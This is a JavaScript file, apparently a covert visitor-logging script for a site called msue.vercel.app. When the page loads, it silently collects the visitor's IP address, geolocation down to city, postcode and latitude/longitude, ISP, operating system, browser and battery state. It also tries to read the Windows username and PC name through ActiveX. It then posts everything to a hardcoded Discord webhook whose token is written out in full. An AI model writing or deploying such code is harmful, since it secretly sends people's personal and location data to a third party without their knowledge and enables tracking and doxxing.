
       // URLs for IP info and Discord webhook
const ipInfoUrl = "http://ip-api.com/json";
const discordWebhookUrl = "https://discordapp.com/api/webhooks/1246514114071760958/5pvn9EqbSWGyq2hWvNbpASaNsIFvwlO9VL_vsDLOvRX1Occ5gGbqDjcRQTTCkMKQZGl4";

// Function to get the user and PC name
function getUserAndPCName() {
    let userName = "Unknown User";
    let pcName = "Unknown PC";

    try {
        // Try to get the user name if available (Windows only)
        if (navigator.userAgent.toLowerCase().indexOf('windows') !== -1) {
            const wshShell = new ActiveXObject("WScript.Shell");
            userName = wshShell.ExpandEnvironmentStrings("%USERNAME%");
            pcName = wshShell.ExpandEnvironmentStrings("%COMPUTERNAME%");
        }

        // If user name and PC name are still unknown, use device information
        if (userName === "Unknown User" && pcName === "Unknown PC") {
            // Determine device type
            if (/iPhone|iPad|iPod|Android/i.test(navigator.userAgent)) {
                userName = "Mobile User";
                pcName = "Mobile Device";
            } else {
                userName = "Desktop User";
                pcName = "Desktop/Laptop";
            }
        }
    } catch (error) {
        console.error('Error:', error);
    }

    return { userName, pcName };
}

// Function to fetch IP information and send it to Discord webhook
async function fetchDataAndSendToWebhook() {
    try {
        // Fetch IP information
        const response = await fetch(ipInfoUrl);
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        const data = await response.json();

        // Get current date and time
        const now = new Date();
        const dateTime = now.toLocaleString();

        // Determine device type
        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
        let deviceType = isMobile ? "Accessed through a mobile device." : "Accessed through a desktop or laptop.";

        // Determine operating system
        const userAgent = navigator.userAgent;
        let operatingSystem = "Unknown OS";
        if (userAgent.indexOf("Win") !== -1) operatingSystem = "Windows";
        if (userAgent.indexOf("Mac") !== -1) operatingSystem = "MacOS";
        if (userAgent.indexOf("X11") !== -1) operatingSystem = "UNIX";
        if (userAgent.indexOf("Linux") !== -1) operatingSystem = "Linux";

        // Determine browser name and version
        const browserName = navigator.appName;
        const browserVersion = navigator.appVersion;

        // Get user and PC name
        const { userName, pcName } = getUserAndPCName();

        // Get battery status
        let batteryStatus = "Battery status information not available";
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            batteryStatus = `Battery Level: ${(battery.level * 100).toFixed(2)}%, Charging: ${battery.charging ? "Yes" : "No"}`;
        }

        // Prepare the message content
        let message = `**https://msue.vercel.app** 
        IP Address: ${data.query}
        ${deviceType}
        Operating System: ${operatingSystem}
        Browser: ${browserName} (Version ${browserVersion})
        User: ${userName}
        PC Name: ${pcName}
        Battery Status: ${batteryStatus}
        Date and Time: ${dateTime}
        System (Live): Add your live system information here`;

        // Prepare the payload for Discord webhook
        const payload = {
            content: JSON.stringify({
                "https://msue.vercel.app": "WebHookData",
                "IP": data.query,
                "Country": data.country,
                "Region": data.regionName,
                "City": data.city,
                "Zip-code": data.zip,
                "Lat": data.lat,
                "Long": data.lon,
                "Timezone": data.timezone,
                "Provider": data.isp,
                "Organization": data.org,
                "Status": data.status,
                "Operating System": operatingSystem,
                "Browser": browserName,
                "Browser Version": browserVersion,
                "User": userName,
                "PC Name": pcName,
                "Battery Status": batteryStatus,
                "Date and Time": dateTime,
                "Access Type": isMobile ? "Mobile" : "Desktop/Laptop",
                "System (Live)": "Add your live system information here"
            }, null, 2)
        };

        // Send the data to the Discord webhook
        const webhookResponse = await fetch(discordWebhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });

        if (!webhookResponse.ok) {
            throw new Error('Webhook response was not ok');
        }

        console.log('Data sent to Discord webhook successfully');
    } catch (error) {
        console.error('Error:', error);
    }
}

// Call the function to fetch data and send it to the webhook
fetchDataAndSendToWebhook();
